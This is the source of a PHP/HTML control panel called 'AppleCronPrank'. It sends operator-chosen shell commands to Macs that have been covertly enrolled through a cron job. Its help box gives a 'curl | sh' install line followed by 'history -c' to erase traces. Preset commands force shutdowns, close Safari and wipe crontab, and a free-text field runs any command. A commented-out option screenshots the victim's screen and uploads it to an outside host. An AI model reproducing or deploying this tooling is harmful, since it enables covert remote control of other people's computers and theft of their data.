<?php

// Make this page only accessible via index.php?xyz=abc

if ($_GET['xyz'] != "abc") {
    exit("Nothing to see here");
}

?>
<!doctype html>

<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <title>AppleCronPrank</title>
    <meta name="description" content="Take control">
    <meta name="author" content="Jerome Saint-Clair aka 01010101">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

    <!-- Optional theme -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">

<script src="https://code.jquery.com/jquery-2.2.0.min.js"></script>

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>

  <!--[if lt IE 9]>
  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <![endif]-->
</head>

<script>
window.addEventListener("load", function () {
  function sendData() {
    var XHR = new XMLHttpRequest();

    
    // We bind the FormData object and the form element
    var FD  = new FormData(form);

    // We define what will happen if the data are successfully sent
    XHR.addEventListener("load", function(event) {
        var msg = "Script updated to " + (event.target.responseText == "" ? "not run any command." : "run the following command:<br/>" + event.target.responseText); 
        document.getElementById("result").innerHTML = msg;
        document.getElementById("other_cmd").value = "";
    });

    // We define what will happen in case of error
    XHR.addEventListener("error", function(event) {
      alert('Oups! Something went wrong.');
    });

    // We setup our request
    XHR.open("POST", "update.php");

    XHR.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    
    var val = "";
    if (document.getElementById("other_cmd").value != "") {
        val = document.getElementById("other_cmd").value;
    }
    else {
        var id = document.querySelector('input[name=static_cmd]:checked').id;
        val = document.querySelector("cmd[for='" + id + "']").innerHTML;
    }
    XHR.send("cmd="+encodeURIComponent(val));
    // The data sent are the one the user provide in the form
    //XHR.send(FD);
  }
 
  // We need to access the form element
  var form = document.getElementById("cmd_form");

  // to takeover its submit event.
  form.addEventListener("submit", function (event) {
    event.preventDefault();

    sendData();
  });
});



</script>

<body>

<!-- Modal -->
<div id="myModal" class="modal fade" role="dialog">
  <div class="modal-dialog">

    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>
        <h4 class="modal-title">Installation</h4>
      </div>
      <div class="modal-body">
        <p><b>Open Terminal & type these 2 commands</b></p>
        <p>curl -sL yourdomain.ext?i | sh</p>
        <p>history -c; reset</p>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>

  </div>
</div>

<br>

<div class="container-fluid">
    <button type="button-link" class="pull-right" data-toggle="modal" data-target="#myModal">Help</button>    
</div>

<div class="container-fluid">

    <form action="update.php" id="cmd_form">

        <div class="form-group" id="static_cmds">
            <label for="static_cmds">Select a command</label>
             <div class="btn-group-vertical col-xs-12" data-toggle="buttons" style="margin-bottom: 20px">  
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd1">RESTART
                    <cmd for="static_cmd1" hidden>osascript -e 'tell application "Finder" to restart'</cmd>
                </label>
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd2"> SHUT DOWN
                    <cmd for="static_cmd2" hidden>osascript -e 'tell application "Finder" to shut down'</cmd>
                </label>
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd3">CLOSE SAFARI
                    <cmd for="static_cmd3" hidden>osascript -e 'tell application "Safari" to close every window'</cmd>
                </label>
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd4">APPLE IS WATCHING YOU
                    <cmd for="static_cmd4" hidden>say -v Whisper "Apple is watching you"</cmd>
                </label>
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd5">BLAH BLAH BLAH
                    <cmd for="static_cmd5" hidden>open http://02020202.fr/a</cmd>
                </label>
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd6">CHILD LABOR
                    <cmd for="static_cmd6" hidden>open http://fortune.com/2016/01/19/apple-child-labor/</cmd>
                </label>
<!--
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd7">UPLOAD SCREENSHOT
                    <cmd for="static_cmd7" hidden>screencapture -x sc.png; curl -F "file=@sc.png;type=image/png" -L 02020202.fr/meth/upload.php</cmd>
                </label>
--> 
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd8">SNOWDEN FBI
                    <cmd for="static_cmd8" hidden>open https://twitter.com/Snowden/status/699984388067557376</cmd>
                </label>
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd9">REMOVE CRON JOB
                    <cmd for="static_cmd9" hidden>crontab -r</cmd>
                </label>
                 <label class="btn btn-xs btn-primary btn-default btn-block">
                    <input type="radio" name="static_cmd" id="static_cmd10">REMOVE CRON JOB AND SHUTDOWN
                    <cmd for="static_cmd10" hidden>crontab -r;osascript -e 'tell application "Finder" to shut down'</cmd>
                </label>
                <label class="btn btn-xs btn-primary btn-default btn-block">        
                    <input type="radio" name="static_cmd" id="static_cmd11">NO SCRIPT
                    <cmd for="static_cmd11" hidden></cmd>
                 </label>
            </div>
        </div>

        <div class="form-group" style="margin-bottom: 45px">
                <label for="other_cmd">Enter command</label>
                 <div class="col-xs-12">
                    <input type="text" id="other_cmd" class="form-control" name="other_cmd">
                </div>
        </div>
        <div class="form-group">
             <div class="col-xs-12">
                <input class="btn btn-xs btn-default btn-block btn-danger" type="submit" value="UPDATE">
            </div>
        </div>

    </form>

</div>

<div class="container-fluid" style="margin-top: 20px">
    <p id="result"></p>
</div>

</body>
</html>


